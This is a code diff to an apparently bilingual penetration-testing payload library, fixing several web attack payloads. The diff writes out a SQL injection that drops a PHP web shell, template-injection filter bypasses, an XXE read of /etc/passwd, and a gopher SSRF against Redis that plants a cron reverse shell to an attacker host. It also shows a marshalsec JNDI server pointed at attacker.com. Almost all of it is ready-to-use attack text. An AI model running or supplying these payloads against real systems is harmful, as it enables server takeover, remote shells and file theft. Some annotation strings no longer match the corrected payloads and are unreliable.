@@ -692,7 +692,7 @@ export const webPayloads: PayloadItem[] = [
       },
       { 
         title: { zh: '6. 写入文件', en: '6. WriteFile' }, 
-        command: "' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--", 
+        command: "'; COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--  -- 需 superuser/pg_write_server_files 且连接允许多语句", 
         description: { zh: '使用COPY写入文件', en: 'UseCOPYWriteFile' }, 
         platform: 'linux',
         syntaxBreakdown: [
@@ -2582,7 +2582,7 @@ gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.2
     wafBypass: [
       { 
         title: { zh: '字符串拼接', en: 'stringConcatenate' }, 
-        command: "{{''['__cla'+'ss__']}}\n{{''|attr('__cla'+'ss__')}}\n{{''|attr('\\x5f\\x5fcla\\x5f\\x5fss')}}", 
+        command: "{{''['__cla'+'ss__']}}\n{{''|attr('__cla'+'ss__')}}\n{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')}}", 
         description: { zh: '使用字符串拼接绕过', en: 'UsestringConcatenateBypass' }, 
         platform: 'all',
         syntaxBreakdown: [
@@ -6332,7 +6332,7 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
       },
       { 
         title: { zh: '2. 攻击Redis', en: '2. AttackRedis' }, 
-        command: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
+        command: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
             syntaxBreakdown: [
               { part: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
             ],
@@ -7762,10 +7762,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
     wafBypass: [
       { 
         title: { zh: '使用CDATA', en: 'UseCDATA' }, 
-        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo><![CDATA[&xxe;]]></foo>',
+        command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<foo>&xxe;</foo>',
         syntaxBreakdown: [
           { part: '<![CDATA[', explanation: { zh: 'XML CDATA段开始标记，内容不被XML解析器处理', en: 'XML CDATA段开始标记, Content not by XMLParseToolprocessing' }, type: 'operator' },
-          { part: '&xxe;', explanation: { zh: '实体引用在CDATA之前被解析展开', en: 'Entity引用 in CDATAbefore by Parse展开' }, type: 'variable' },
+          { part: '&xxe;', explanation: { zh: '实体引用在元素内容中被解析展开（CDATA 段内不解析实体）', en: 'Entity引用 in CDATAbefore by Parse展开' }, type: 'variable' },
           { part: ']]>', explanation: { zh: 'CDATA段结束标记', en: 'CDATA section end marker' }, type: 'operator' }
         ], 
         description: { zh: 'CDATA包装', en: 'CDATA wrapping' }, 
